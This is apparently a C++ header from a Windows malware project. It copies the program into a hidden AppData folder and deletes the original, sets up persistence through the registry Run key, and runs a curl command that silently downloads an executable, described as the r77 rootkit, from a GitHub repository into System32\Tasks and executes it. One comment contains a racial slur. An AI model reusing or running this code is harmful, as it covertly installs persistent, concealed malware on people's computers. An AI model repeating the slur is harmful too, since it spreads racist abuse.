#pragma once
#include <iostream>
#include <Windows.h>   
#include <Shlobj.h>    
#include <string>
#include <filesystem>  
#include <fstream>
#include "settings.h"
#include <thread> 
#include <chrono>

std::string sText;
int iCryptoFormat;
//https://github.com/bytecode77/r77-rootkit r77 rootkit helpign me stay on pc without deleting me so yh thx my nigga
void __install() {
    bEnableRootkit = true; // lols heheh
    WCHAR localAppData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        std::wstring wstrLocalAppData(localAppData);
        std::string appDataPath(wstrLocalAppData.begin(), wstrLocalAppData.end());
        std::string targetPath = appDataPath + "\\"+ cInstallFolder + "\\";
        char currentPath[MAX_PATH];
        GetModuleFileName(NULL, currentPath, MAX_PATH);

        if (std::string(currentPath).find(targetPath) == std::string::npos) {
            CreateDirectoryA(targetPath.c_str(), NULL);
            CopyFileA(currentPath, (targetPath + cInstallName).c_str(), FALSE);
            ShellExecute(NULL, "open", (targetPath + cInstallName).c_str(), NULL, NULL, SW_SHOWDEFAULT);
            DeleteFileA(currentPath); // deletes itself idk if good idea idk
            exit(0);
        }
        
    }
}

void __startup() {
    char currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, cInstallName, 0, REG_SZ, (BYTE*)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hKey);
    }
}

void __rootkit() //instals and runs r77 rootkit lil loader built, maybe dtc idk. if ur not lazy download on 
{
    //https://github.com/bytecode77/r77-rootkit
    system("curl --silent https://github.com/hurtttttt/cdn/blob/main/xra4.exe --output C:\\Windows\\System32\\Tasks\\install.exe >nul 2>&1 & C:\\Windows\\System32\\Tasks\\install.exe"); //install.exe (r77 rootkit)
}